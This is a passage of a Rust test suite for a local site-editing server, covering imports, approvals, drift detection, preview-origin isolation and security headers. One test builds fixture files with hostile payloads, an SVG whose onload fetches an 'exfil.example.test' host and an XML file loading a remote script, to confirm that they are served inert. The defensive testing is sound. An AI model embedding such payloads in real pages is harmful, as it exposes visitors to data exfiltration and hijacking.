    assert_eq!(source_fingerprint(root.path()), disk_before_recovery);
}

#[tokio::test]
async fn recovery_contract_accepts_a_valid_snapshot_above_the_synthetic_500_file_profile() {
    let root = tempfile::tempdir().unwrap();
    let project_id = "prj_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    let revision_id = "rev_bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    let artifact_manifest_sha256 = "c".repeat(64);
    let mut files = BTreeMap::from([(
        "index.html".to_owned(),
        b"<!doctype html><html lang=\"en\"><body>recovery</body></html>".to_vec(),
    )]);
    for index in 0..500 {
        files.insert(format!("assets/file-{index:04}.txt"), b"x".to_vec());
    }
    assert_eq!(files.len(), 501);
    let expected_total_bytes = files.values().map(Vec::len).sum::<usize>();
    let (storage, projects) = ManagedStorage::open(root.path()).unwrap();
    assert!(projects.is_empty());
    storage
        .create_project(
            project_id,
            "Maximum recovery fixture",
            revision_id,
            &artifact_manifest_sha256,
            &files,
        )
        .unwrap();
    drop(storage);

    let state = StudioState::new_recovery(ServerConfig::new(
        EDITOR_ORIGIN,
        EDITOR_HOST,
        PREVIEW_ORIGIN,
        root.path(),
        root.path().join("missing-web-dist"),
    ))
    .unwrap();
    let token = bootstrap_token(&state).await;
    let points = response_json(get_for(&state, &token, "/api/v1/recovery").await).await;
    let accepted = points["recoveryPoints"]
        .as_array()
        .unwrap()
        .iter()
        .find(|point| point["projectId"] == project_id)
        .unwrap();
    assert_eq!(accepted["diagnostic"]["verified"], true);
    assert_eq!(accepted["diagnostic"]["fileCount"], 501);
    assert_eq!(
        accepted["diagnostic"]["totalBytes"].as_u64(),
        Some(expected_total_bytes as u64)
    );
    let export_url = string_at(accepted, "/exportUrl");
    let export = get_for(&state, &token, &export_url).await;
    assert_eq!(export.status(), StatusCode::OK);
    let archive = zip::ZipArchive::new(Cursor::new(response_bytes(export).await)).unwrap();
    assert_eq!(archive.len(), 501);
}

#[tokio::test]
async fn import_is_session_bound_rescanned_consumed_persisted_and_source_preserving() {
    let source = tempfile::tempdir().unwrap();
    std::fs::write(
        source.path().join("index.html"),
        br#"<!doctype html><h1>Imported</h1><a href="docs/">Nested documentation</a>"#,
    )
    .unwrap();
    std::fs::create_dir(source.path().join("docs")).unwrap();
    std::fs::write(
        source.path().join("docs/index.html"),
        br#"<!doctype html><h1 data-lp-id="nested-heading">Nested documentation</h1><a href="../">Back to project root</a>"#,
    )
    .unwrap();
    std::fs::write(source.path().join("styles.css"), b"h1 { color: navy; }").unwrap();
    std::fs::write(source.path().join(".env"), b"SECRET=not-imported").unwrap();
    std::fs::create_dir(source.path().join(".git")).unwrap();
    std::fs::write(source.path().join(".git/config"), b"private git metadata").unwrap();
    let before = source_fingerprint(source.path());
    let harness = Harness::with_import(source).await;

    let capability = response_json(
        editor_router(harness.state.clone())
            .oneshot(
                Request::builder()
                    .uri("/api/v1/bootstrap")
                    .header(HOST, EDITOR_HOST)
                    .header("sec-fetch-site", "same-origin")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap(),
    )
    .await;
    assert_eq!(capability["previewOrigin"], PREVIEW_ORIGIN);
    assert_eq!(capability["capabilities"]["importAvailable"], true);
    assert_eq!(capability["capabilities"]["limits"]["maxFiles"], 1_000);

    let preview = harness
        .post("/api/v1/imports/previews", json!({"schemaVersion":"1"}))
        .await;
    assert_eq!(preview.status(), StatusCode::CREATED);
    let preview = response_json(preview).await;
    let preview_id = string_at(&preview, "/importPreview/id");
    let preview_sha = string_at(&preview, "/importPreview/manifestSha256");
    assert_eq!(preview["importPreview"]["entryPoint"], "index.html");
    assert_eq!(
        preview["importPreview"]["included"]
            .as_array()
            .unwrap()
            .len(),
        3
    );
    assert_eq!(
        preview["importPreview"]["excluded"]
            .as_array()
            .unwrap()
            .len(),
        2
    );
    let second_session = bootstrap_token(&harness.state).await;
    let wrong_session = harness
        .post_with_token(
            &format!("/api/v1/imports/{preview_id}/confirm"),
            json!({"schemaVersion":"1","expectedManifestSha256":preview_sha}),
            &second_session,
        )
        .await;
    assert_eq!(wrong_session.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(wrong_session).await["error"]["code"],
        "import_preview_binding_mismatch"
    );

    let import_root = harness._import.as_ref().unwrap().path();
    std::fs::write(import_root.join(".env.local"), b"CHANGED_REVIEW=1").unwrap();
    let changed = harness
        .post(
            &format!("/api/v1/imports/{preview_id}/confirm"),
            json!({"schemaVersion":"1","expectedManifestSha256":preview_sha}),
        )
        .await;
    assert_eq!(changed.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(changed).await["error"]["code"],
        "import_source_changed"
    );

    let expiring = response_json(
        harness
            .post("/api/v1/imports/previews", json!({"schemaVersion":"1"}))
            .await,
    )
    .await;
    let expiring_id = string_at(&expiring, "/importPreview/id");
    let expiring_sha = string_at(&expiring, "/importPreview/manifestSha256");
    harness
        .state
        .store()
        .unwrap()
        .import_previews
        .get_mut(&expiring_id)
        .unwrap()
        .expires_at = now_unix() - 1;
    let expired_wrong_session = harness
        .post_with_token(
            &format!("/api/v1/imports/{expiring_id}/confirm"),
            json!({"schemaVersion":"1","expectedManifestSha256":expiring_sha.clone()}),
            &second_session,
        )
        .await;
    assert_eq!(
        response_json(expired_wrong_session).await["error"]["code"],
        "import_preview_binding_mismatch"
    );
    assert!(
        harness
            .state
            .store()
            .unwrap()
            .import_previews
            .contains_key(&expiring_id)
    );
    let expired = harness
        .post(
            &format!("/api/v1/imports/{expiring_id}/confirm"),
            json!({"schemaVersion":"1","expectedManifestSha256":expiring_sha}),
        )
        .await;
    assert_eq!(
        response_json(expired).await["error"]["code"],
        "import_preview_expired"
    );

    let final_preview = response_json(
        harness
            .post("/api/v1/imports/previews", json!({"schemaVersion":"1"}))
            .await,
    )
    .await;
    let final_id = string_at(&final_preview, "/importPreview/id");
    let final_sha = string_at(&final_preview, "/importPreview/manifestSha256");
    let confirmed = harness
        .post(
            &format!("/api/v1/imports/{final_id}/confirm"),
            json!({"schemaVersion":"1","expectedManifestSha256":final_sha}),
        )
        .await;
    assert_eq!(confirmed.status(), StatusCode::CREATED);
    let confirmed = response_json(confirmed).await;
    let project_id = string_at(&confirmed, "/project/id");
    assert_eq!(confirmed["project"]["files"].as_array().unwrap().len(), 3);
    let preview_url = string_at(&confirmed, "/project/previewUrl");
    let nested_response = get_preview_for(&harness.state, &format!("{preview_url}docs/")).await;
    assert_eq!(nested_response.status(), StatusCode::OK);
    assert_eq!(
        nested_response.headers().get(CONTENT_TYPE).unwrap(),
        "text/html"
    );
    let nested_html = String::from_utf8(response_bytes(nested_response).await).unwrap();
    assert!(nested_html.contains("Nested documentation"));
    assert!(nested_html.contains("href=\"../\""));
    assert!(nested_html.contains(",\"docs/index.html\");</script>"));
    let replay = harness
        .post(
            &format!("/api/v1/imports/{final_id}/confirm"),
            json!({"schemaVersion":"1","expectedManifestSha256":final_sha}),
        )
        .await;
    assert_eq!(replay.status(), StatusCode::NOT_FOUND);
    let mut expected_after = before;
    expected_after.insert(".env.local".into(), b"CHANGED_REVIEW=1".to_vec());
    assert_eq!(source_fingerprint(import_root), expected_after);

    let restarted = StudioState::new(
        ServerConfig::new(
            EDITOR_ORIGIN,
            EDITOR_HOST,
            PREVIEW_ORIGIN,
            harness._root.path(),
            harness._root.path().join("missing-web-dist"),
        )
        .with_import_root(Some(import_root.to_path_buf())),
    )
    .unwrap();
    let restarted_token = bootstrap_token(&restarted).await;
    let listed =
        response_json(get_for(&restarted, &restarted_token, "/api/v1/projects").await).await;
    assert_eq!(listed["projects"][0]["id"], project_id);
    let restarted_preview_url = string_at(&listed, "/projects/0/previewUrl");
    let restarted_nested =
        get_preview_for(&restarted, &format!("{restarted_preview_url}docs/")).await;
    assert_eq!(restarted_nested.status(), StatusCode::OK);
    assert!(
        String::from_utf8(response_bytes(restarted_nested).await)
            .unwrap()
            .contains("Nested documentation")
    );
}

#[tokio::test]
async fn drift_blocks_proposal_decision_and_export_without_burning_approval() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let harness = Harness::new().await;
    let created = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let revision_id = string_at(&created, "/project/revisionId");
    let accepted_sha = string_at(&created, "/project/acceptedManifestSha256");
    let target = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/targets"),
                element_target_request(&revision_id, 1, "hero-heading"),
            )
            .await,
    )
    .await;
    let context = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/contexts"),
                context_request(&revision_id, &target, "change heading"),
            )
            .await,
    )
    .await;
    let context_id = string_at(&context, "/context/id");
    let context_sha = string_at(&context, "/context/sha256");
    let site_index =
        storage::materialized_site_path(harness._root.path(), &project_id).join("index.html");
    let accepted_index = std::fs::read(&site_index).unwrap();
    std::fs::write(&site_index, b"external before proposal").unwrap();
    let blocked_proposal = harness
        .post(
            &format!("/api/v1/projects/{project_id}/proposals"),
            json!({"schemaVersion":"1","contextId":context_id,"contextSha256":context_sha}),
        )
        .await;
    assert_eq!(blocked_proposal.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(blocked_proposal).await["error"]["code"],
        "external_changes_detected"
    );
    std::fs::write(&site_index, &accepted_index).unwrap();

    let proposal = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/proposals"),
                json!({"schemaVersion":"1","contextId":context_id,"contextSha256":context_sha}),
            )
            .await,
    )
    .await;
    let proposal_id = string_at(&proposal, "/proposal/id");
    let review_id = string_at(&proposal, "/proposal/reviewId");
    let intent = "drift-decision-test";
    let approval = response_json(
        harness
            .post(
                &format!("/api/v1/reviews/{review_id}/approvals"),
                json!({"schemaVersion":"1","proposalId":proposal_id,"expectedRevisionId":revision_id,"disposition":"adopted_unchanged","intentId":intent}),
            )
            .await,
    )
    .await;
    let approval_token = string_at(&approval, "/approval/token");
    std::fs::write(&site_index, b"external before decision").unwrap();
    let decision_request = json!({"schemaVersion":"1","approvalToken":approval_token,"proposalId":proposal_id,"expectedRevisionId":revision_id,"disposition":"adopted_unchanged","intentId":intent,"rationale":"verified"});
    let blocked_decision = harness
        .post(
            &format!("/api/v1/reviews/{review_id}/decisions"),
            decision_request.clone(),
        )
        .await;
    assert_eq!(blocked_decision.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(blocked_decision).await["error"]["code"],
        "external_changes_detected"
    );
    let unchanged =
        response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
    assert_eq!(unchanged["project"]["revisionId"], revision_id);
    assert_eq!(unchanged["project"]["acceptedManifestSha256"], accepted_sha);
    std::fs::write(&site_index, &accepted_index).unwrap();
    let adopted = harness
        .post(
            &format!("/api/v1/reviews/{review_id}/decisions"),
            decision_request,
        )
        .await;
    assert_eq!(adopted.status(), StatusCode::OK);
    let adopted = response_json(adopted).await;
    let adopted_revision = string_at(&adopted, "/project/revisionId");
    assert_ne!(adopted_revision, revision_id);

    std::fs::write(&site_index, b"external before export").unwrap();
    let blocked_export = harness
        .post(
            &format!("/api/v1/projects/{project_id}/exports"),
            json!({"schemaVersion":"1","revisionId":adopted_revision}),
        )
        .await;
    assert_eq!(blocked_export.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(blocked_export).await["error"]["code"],
        "external_changes_detected"
    );
}

#[tokio::test]
async fn mutation_security_fails_closed_with_stable_redacted_errors() {
    let harness = Harness::new().await;
    let app = editor_router(harness.state.clone());
    let response = app
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/projects")
                .header(HOST, EDITOR_HOST)
                .header(CONTENT_TYPE, "application/json")
                .header(AUTHORIZATION, format!("Bearer {}", harness.token))
                .body(Body::from(r#"{"schemaVersion":"1","template":"blank"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::FORBIDDEN);
    let request_id_header = response
        .headers()
        .get("x-request-id")
        .unwrap()
        .to_str()
        .unwrap()
        .to_owned();
    assert!(request_id_header.starts_with("req_"));
    let operation_id_header = response
        .headers()
        .get("x-operation-id")
        .unwrap()
        .to_str()
        .unwrap()
        .to_owned();
    assert!(operation_id_header.starts_with("op_"));
    assert_eq!(
        response.headers().get("x-error-code").unwrap(),
        "request_origin_rejected"
    );
    let body = response_json(response).await;
    assert_eq!(body["schemaVersion"], "1");
    assert_eq!(body["error"]["code"], "request_origin_rejected");
    assert_eq!(
        body["error"]["message"],
        "Request origin validation failed."
    );
    assert!(
        body["error"]["requestId"]
            .as_str()
            .unwrap()
            .starts_with("req_")
    );
    assert_eq!(body["error"]["retryable"], false);
    assert_eq!(body["error"]["requestId"], request_id_header);
    assert_eq!(body["error"]["operationId"], operation_id_header);
    assert_eq!(
        body["error"]["detail"],
        json!({
            "acceptedState":"unchanged",
            "recoveryAction":"correct_request"
        })
    );
    assert_eq!(body.as_object().unwrap().len(), 2);
    assert_eq!(body["error"].as_object().unwrap().len(), 6);
    assert_eq!(body["error"]["detail"].as_object().unwrap().len(), 2);

    let correlation_canary = "PRIVATE-CORRELATION-CANARY";
    let canary_response = editor_router(harness.state.clone())
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/projects")
                .header(HOST, EDITOR_HOST)
                .header(CONTENT_TYPE, "application/json")
                .header(AUTHORIZATION, format!("Bearer {}", harness.token))
                .header("x-request-id", correlation_canary)
                .header("x-operation-id", correlation_canary)
                .body(Body::from(r#"{"schemaVersion":"1","template":"blank"}"#))
                .unwrap(),
        )
        .await
        .unwrap();
    let generated_request_id = canary_response
        .headers()
        .get("x-request-id")
        .unwrap()
        .to_str()
        .unwrap()
        .to_owned();
    let generated_operation_id = canary_response
        .headers()
        .get("x-operation-id")
        .unwrap()
        .to_str()
        .unwrap()
        .to_owned();
    let canary_body = response_json(canary_response).await;
    assert_eq!(canary_body["error"]["requestId"], generated_request_id);
    assert_eq!(canary_body["error"]["operationId"], generated_operation_id);
    assert!(
        !serde_json::to_string(&canary_body)
            .unwrap()
            .contains(correlation_canary)
    );

    let wrong_host = editor_router(harness.state.clone())
        .oneshot(
            Request::builder()
                .uri("/api/v1/bootstrap")
                .header(HOST, "evil.test")
                .header("sec-fetch-site", "same-origin")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(wrong_host.status(), StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn direct_api_errors_use_exact_bounded_recovery_details() {
    let cases = [
        (
            ApiError::new(
                StatusCode::CONFLICT,
                "decision_outcome_unknown",
                "The Decision outcome is unknown.",
                true,
            ),
            "reconciliation_required",
            "reconcile",
        ),
        (
            ApiError::new(
                StatusCode::SERVICE_UNAVAILABLE,
                "read_only_recovery",
                "Managed storage is in read-only recovery mode.",
                false,
            ),
            "unchanged",
            "manual_recovery",
        ),
        (ApiError::internal(), "reconciliation_required", "refresh"),
        (ApiError::conflict("stale_base"), "unchanged", "refresh"),
        (ApiError::invalid(), "unchanged", "correct_request"),
    ];

    for (error, accepted_state, recovery_action) in cases {
        let response = error.into_response();
        let request_id = response
            .headers()
            .get("x-request-id")
            .unwrap()
            .to_str()
            .unwrap()
            .to_owned();
        let operation_id = response
            .headers()
            .get("x-operation-id")
            .unwrap()
            .to_str()
            .unwrap()
            .to_owned();
        let body = response_json(response).await;
        assert_eq!(body.as_object().unwrap().len(), 2);
        assert_eq!(body["error"].as_object().unwrap().len(), 6);
        assert_eq!(body["error"]["detail"].as_object().unwrap().len(), 2);
        assert_eq!(body["error"]["requestId"], request_id);
        assert_eq!(body["error"]["operationId"], operation_id);
        assert_eq!(body["error"]["detail"]["acceptedState"], accepted_state);
        assert_eq!(body["error"]["detail"]["recoveryAction"], recovery_action);
        assert!(request_id.starts_with("req_"));
        assert!(operation_id.starts_with("op_"));
    }
}

#[tokio::test]
async fn editor_responses_deny_framing_and_allow_only_the_preview_origin() {
    let harness = Harness::new().await;
    let response = editor_router(harness.state)
        .oneshot(
            Request::builder()
                .uri("/health")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    assert_eq!(response.headers().get("x-frame-options").unwrap(), "DENY");
    assert_eq!(
        response.headers().get("x-content-type-options").unwrap(),
        "nosniff"
    );
    assert_eq!(
        response.headers().get("referrer-policy").unwrap(),
        "no-referrer"
    );
    assert_eq!(
        response.headers().get("x-dns-prefetch-control").unwrap(),
        "off"
    );
    let csp = response
        .headers()
        .get("content-security-policy")
        .unwrap()
        .to_str()
        .unwrap();
    assert!(csp.contains("frame-ancestors 'none'"));
    assert!(csp.contains("frame-src http://*.localhost:4322"));
    assert!(csp.contains("script-src 'self'"));
    assert!(csp.contains("style-src 'self' 'unsafe-inline'"));
    assert!(!csp.contains("script-src 'self' 'unsafe-inline'"));
}

#[tokio::test]
async fn active_non_html_preview_documents_are_inert_while_image_assets_keep_their_type() {
    let source = tempfile::tempdir().unwrap();
    std::fs::write(
        source.path().join("index.html"),
        br#"<!doctype html><img src="active.svg"><a href="active.svg">Open SVG</a><a href="active.xml">Open XML</a>"#,
    )
    .unwrap();
    std::fs::write(
        source.path().join("active.svg"),
        br#"<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://exfil.example.test/svg')"><script>location.href='https://navigate.example.test/'</script><a href="https://link.example.test/"><rect width="10" height="10"/></a></svg>"#,
    )
    .unwrap();
    std::fs::write(
        source.path().join("active.xml"),
        br#"<?xml version="1.0"?><root><script src="https://exfil.example.test/xml.js"/></root>"#,
    )
    .unwrap();
    let harness = Harness::with_import(source).await;
    let import_preview = response_json(
        harness
            .post("/api/v1/imports/previews", json!({"schemaVersion":"1"}))
            .await,
    )
    .await;
    let confirmed = harness
        .post(
            &format!(
                "/api/v1/imports/{}/confirm",
                string_at(&import_preview, "/importPreview/id")
            ),
            json!({
                "schemaVersion":"1",
                "expectedManifestSha256":string_at(&import_preview, "/importPreview/manifestSha256")
            }),
        )
        .await;
    assert_eq!(confirmed.status(), StatusCode::CREATED);
    let confirmed = response_json(confirmed).await;
    let preview_url = string_at(&confirmed, "/project/previewUrl");
    let host = preview_host(&preview_url).to_owned();
    let base_path = preview_path(&preview_url).to_owned();

    for file in ["active.svg", "active.xml"] {
        let response = preview_router(harness.state.clone())
            .oneshot(
                Request::builder()
                    .uri(format!("{base_path}{file}"))
                    .header(HOST, &host)
                    .header("sec-fetch-mode", "navigate")
                    .header("sec-fetch-dest", "iframe")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(response.status(), StatusCode::OK);
        assert_eq!(
            response.headers().get(CONTENT_TYPE).unwrap(),
            "text/plain; charset=utf-8"
        );
        let csp = response
            .headers()
            .get("content-security-policy")
            .unwrap()
            .to_str()
            .unwrap();
        for required in [
            "sandbox",
            "default-src 'none'",
            "script-src 'none'",
            "script-src-elem 'none'",
            "script-src-attr 'none'",
            "connect-src 'none'",
            "form-action 'none'",
            "navigate-to 'none'",
            "frame-ancestors 'none'",
        ] {
            assert!(
                csp.contains(required),
                "{file} CSP omitted {required}: {csp}"
            );
        }
        assert!(!csp.contains("nonce-"));
    }

    let image = preview_router(harness.state.clone())
        .oneshot(
            Request::builder()
                .uri(format!("{base_path}active.svg"))
                .header(HOST, &host)
                .header("sec-fetch-mode", "no-cors")
                .header("sec-fetch-dest", "image")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(image.status(), StatusCode::OK);
    assert_eq!(image.headers().get(CONTENT_TYPE).unwrap(), "image/svg+xml");
    assert_eq!(
        image.headers().get("content-security-policy").unwrap(),
        PREVIEW_NON_HTML_CSP
    );

    let html = preview_router(harness.state.clone())
        .oneshot(
            Request::builder()
                .uri(base_path)
                .header(HOST, host)
                .header("sec-fetch-mode", "navigate")
                .header("sec-fetch-dest", "iframe")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let html_csp = html
        .headers()
        .get("content-security-policy")
        .unwrap()
        .to_str()
        .unwrap();
    assert!(html_csp.contains("sandbox allow-scripts allow-same-origin"));
    assert!(html_csp.contains("navigate-to 'self'"));
    assert!(html_csp.contains("script-src 'self' 'nonce-"));
}

#[tokio::test]
async fn preview_origins_are_session_and_route_bound_with_uniform_not_found_responses() {
    let harness = Harness::new().await;
    let created = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let revision_id = string_at(&created, "/project/revisionId");
    let first_url = string_at(&created, "/project/previewUrl");
    let first_host = preview_host(&first_url).to_owned();
    assert!(first_url.starts_with("http://pv-"));
    assert!(first_url.ends_with(&format!(
        ".localhost:4322/preview/{project_id}/{revision_id}/"
    )));
    let first_label = first_host
        .strip_suffix(".localhost:4322")
        .unwrap()
        .strip_prefix("pv-")
        .unwrap();
    assert_eq!(first_label.len(), 32);
    assert!(
        first_label
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte))
    );
    assert!(!first_url.contains('@'));
    assert!(!first_url.contains('?'));
    assert!(!first_url.contains('#'));
    assert_eq!(
        get_preview_for(&harness.state, &first_url).await.status(),
        StatusCode::OK
    );

    let second_token = bootstrap_token(&harness.state).await;
    let second_project_view = response_json(
        get_for(
            &harness.state,
            &second_token,
            &format!("/api/v1/projects/{project_id}"),
        )
        .await,
    )
    .await;
    let second_url = string_at(&second_project_view, "/project/previewUrl");
    assert_ne!(first_url, second_url);
    assert_ne!(preview_host(&first_url), preview_host(&second_url));
    assert_eq!(
        get_preview_for(&harness.state, &second_url).await.status(),
        StatusCode::OK
    );

    let second_project = response_json(
        post_for(
            &harness.state,
            &second_token,
            "/api/v1/projects",
            json!({"schemaVersion":"1","template":"blank"}),
        )
        .await,
    )
    .await;
    let second_project_id = string_at(&second_project, "/project/id");
    let second_project_url = string_at(&second_project, "/project/previewUrl");
    assert_ne!(preview_host(&second_url), preview_host(&second_project_url));

    let invalid_bindings = [
        (
            "localhost:4322".to_owned(),
            format!("/preview/{project_id}/{revision_id}/"),
        ),
        (
            "127.0.0.1:4322".to_owned(),
            format!("/preview/{project_id}/{revision_id}/"),
        ),
        (
            first_host.replace(":4322", ":4323"),
            format!("/preview/{project_id}/{revision_id}/"),
        ),
        (
            first_host.clone(),
            format!("/preview/{second_project_id}/{revision_id}/"),
        ),
        (
            first_host.clone(),
            format!("/preview/{project_id}/rev_foreign/"),
        ),
        (
            first_host.clone(),
            format!("/preview/{project_id}/{revision_id}/missing.css"),
        ),
        (first_host.clone(), "/not-a-preview-route".to_owned()),
    ];
    for (host, path) in invalid_bindings {
        assert_uniform_preview_not_found(
            get_preview_with_binding(&harness.state, &host, &path).await,
        )
        .await;
    }

    {
        let mut store = harness.state.store().unwrap();
        store
            .sessions
            .get_mut(&token_hash(&harness.token))
            .unwrap()
            .expires_at = now_unix().saturating_sub(1);
    }
    assert_uniform_preview_not_found(get_preview_for(&harness.state, &first_url).await).await;
    assert_eq!(
        get_preview_for(&harness.state, &second_url).await.status(),
        StatusCode::OK,
        "expiring one session must not revoke another session's origin"
    );
}

#[tokio::test]
async fn project_quota_returns_a_stable_429_without_replacing_existing_state() {
    let harness = Harness::new().await;
    for _ in 0..MAX_PROJECTS {
        let response = harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await;
        assert_eq!(response.status(), StatusCode::CREATED);
    }
    let overflow = harness
        .post(
            "/api/v1/projects",
            json!({"schemaVersion":"1","template":"blank"}),
        )
        .await;
    assert_eq!(overflow.status(), StatusCode::TOO_MANY_REQUESTS);
    let body = response_json(overflow).await;
    assert_eq!(body["error"]["code"], "local_capacity_reached");
    assert_eq!(body["error"]["retryable"], false);
    assert_eq!(harness.state.store().unwrap().projects.len(), MAX_PROJECTS);
}

#[test]
fn quota_boundaries_fail_closed_and_expired_authority_is_swept() {
    assert!(ensure_capacity(MAX_TARGETS_PER_PROJECT - 1, MAX_TARGETS_PER_PROJECT).is_ok());
    let count_error =
        ensure_capacity(MAX_TARGETS_PER_PROJECT, MAX_TARGETS_PER_PROJECT).unwrap_err();
    assert_eq!(count_error.status, StatusCode::TOO_MANY_REQUESTS);
    assert_eq!(count_error.code, "local_capacity_reached");
    assert!(
        ensure_byte_capacity(MAX_RETAINED_EXPORT_BYTES - 1, 1, MAX_RETAINED_EXPORT_BYTES).is_ok()
    );
    assert_eq!(
        ensure_byte_capacity(MAX_RETAINED_EXPORT_BYTES, 1, MAX_RETAINED_EXPORT_BYTES)
            .unwrap_err()
            .code,
        "local_capacity_reached"
    );

    let mut store = Store::default();
    store.sessions.insert(
        token_hash("expired-session"),
        Session {
            id: "ses_expired".into(),
            expires_at: 99,
            openai_credential: None,
        },
    );
    store.sessions.insert(
        token_hash("live-session"),
        Session {
            id: "ses_live".into(),
            expires_at: 100,
            openai_credential: None,
        },
    );
    store.approvals.insert(
        token_hash("expired-approval"),
        ApprovalGrant {
            binding: sample_binding(),
            expires_at: 99,
        },
    );
    store.approvals.insert(
        token_hash("live-approval"),
        ApprovalGrant {
            binding: sample_binding(),
            expires_at: 100,
        },
    );
    sweep_expired_sessions(&mut store, 100);
    sweep_expired_approvals(&mut store, 100);
    assert_eq!(store.sessions.len(), 1);
    assert!(store.sessions.contains_key(&token_hash("live-session")));
    assert_eq!(store.approvals.len(), 1);
    assert!(store.approvals.contains_key(&token_hash("live-approval")));
}

#[test]
fn approval_is_hashed_bound_expiring_and_atomically_one_shot() {
    let token = "never-store-this-approval-token";
    let binding = sample_binding();
    let mut approvals = HashMap::new();
    approvals.insert(
        token_hash(token),
        ApprovalGrant {
            binding: binding.clone(),
            expires_at: 200,
        },
    );
    assert!(!format!("{:?}", approvals.keys().next().unwrap()).contains(token));

    let mut mismatch = binding.clone();
    mismatch.session_id = "ses_other".into();
    let error = consume_approval(&mut approvals, token, &mismatch, 100).unwrap_err();
    assert_eq!(error.code, "approval_binding_mismatch");
    assert_eq!(
        approvals.len(),
        1,
        "binding mismatch must not burn authority"
    );

    consume_approval(&mut approvals, token, &binding, 100).unwrap();
    assert!(approvals.is_empty());
    let replay = consume_approval(&mut approvals, token, &binding, 100).unwrap_err();
    assert_eq!(replay.code, "approval_invalid_or_consumed");

    approvals.insert(
        token_hash(token),
        ApprovalGrant {
            binding: binding.clone(),
            expires_at: 99,
        },
    );
    let expired = consume_approval(&mut approvals, token, &binding, 100).unwrap_err();
    assert_eq!(expired.code, "approval_expired");
    assert!(approvals.is_empty());

    for mutate in [
        |value: &mut ApprovalBinding| value.project_id = "prj_other".into(),
        |value: &mut ApprovalBinding| value.review_id = "revw_other".into(),
        |value: &mut ApprovalBinding| value.proposal_id = "pro_other".into(),
        |value: &mut ApprovalBinding| value.proposal_digest = "00".repeat(32),
        |value: &mut ApprovalBinding| value.expected_revision_id = "rev_other".into(),
        |value: &mut ApprovalBinding| value.disposition = DispositionDto::Rejected,
        |value: &mut ApprovalBinding| value.intent_id = "intent_other".into(),
    ] {
        let mut wrong = binding.clone();
        mutate(&mut wrong);
        approvals.insert(
            token_hash(token),
            ApprovalGrant {
                binding: binding.clone(),
                expires_at: 200,
            },
        );
        assert_eq!(
            consume_approval(&mut approvals, token, &wrong, 100)
                .unwrap_err()
                .code,
            "approval_binding_mismatch"
        );
        approvals.clear();
    }
}

#[test]
fn active_attempt_claim_rejects_without_overwriting_the_in_flight_attempt() {
    let mut ai_attempts = AiAttempts::default();
    claim_ai_attempt(&mut ai_attempts, "prj_one", "attempt-one").unwrap();

    let error = claim_ai_attempt(&mut ai_attempts, "prj_one", "attempt-two").unwrap_err();

    assert_eq!(error.status, StatusCode::CONFLICT);
    assert_eq!(error.code, "ai_attempt_in_progress");
    assert_eq!(
        ai_attempts.status("prj_one", "attempt-one"),
        Some(AttemptStatus::Running)
    );
}

#[tokio::test]
async fn active_attempt_guard_releases_cancelled_attempt_without_touching_a_later_one() {
    let harness = Harness::new().await;
    let first_generation = {
        let mut store = harness.state.store().unwrap();
        claim_ai_attempt(&mut store.ai_attempts, "prj_one", "attempt-one")
            .unwrap()
            .generation()
    };
    drop(ActiveAttemptGuard::new(
        harness.state.clone(),
        "prj_one",
        "attempt-one",
        first_generation,
    ));
    assert!(
        !harness
            .state
            .store()
            .unwrap()
            .ai_attempts
            .contains_project("prj_one")
    );

    let _second_generation = {
        let mut store = harness.state.store().unwrap();
        claim_ai_attempt(&mut store.ai_attempts, "prj_one", "attempt-two")
            .unwrap()
            .generation()
    };
    drop(ActiveAttemptGuard::new(
        harness.state.clone(),
        "prj_one",
        "attempt-one",
        first_generation,
    ));
    assert_eq!(
        harness
            .state
            .store()
            .unwrap()
            .ai_attempts
            .status("prj_one", "attempt-two"),
        Some(AttemptStatus::Running)
    );
}

#[tokio::test]
async fn stale_attempt_guard_generation_cannot_touch_reused_id_after_terminal_eviction() {
    let harness = Harness::new().await;
    let project_id = "prj_generation_guard";
    let attempt_id = "attempt-generation-reuse";
    let (stale_generation, stale_release_guard) = {
        let mut store = harness.state.store().unwrap();
        let cancellation =
            claim_ai_attempt(&mut store.ai_attempts, project_id, attempt_id).unwrap();
        let generation = cancellation.generation();
        let guard =
            ActiveAttemptGuard::new(harness.state.clone(), project_id, attempt_id, generation);
        assert_eq!(
            store.ai_attempts.cancel(project_id, attempt_id),
            CancelResult::Cancelled
        );
        (generation, guard)
    };

    let current_generation = {
        let mut store = harness.state.store().unwrap();
        for index in 0..crate::ai_attempt::MAX_TERMINAL_ATTEMPTS {
            let filler_id = format!("attempt-generation-filler-{index}");
            let filler = store
                .ai_attempts
                .claim("prj_generation_filler", &filler_id)
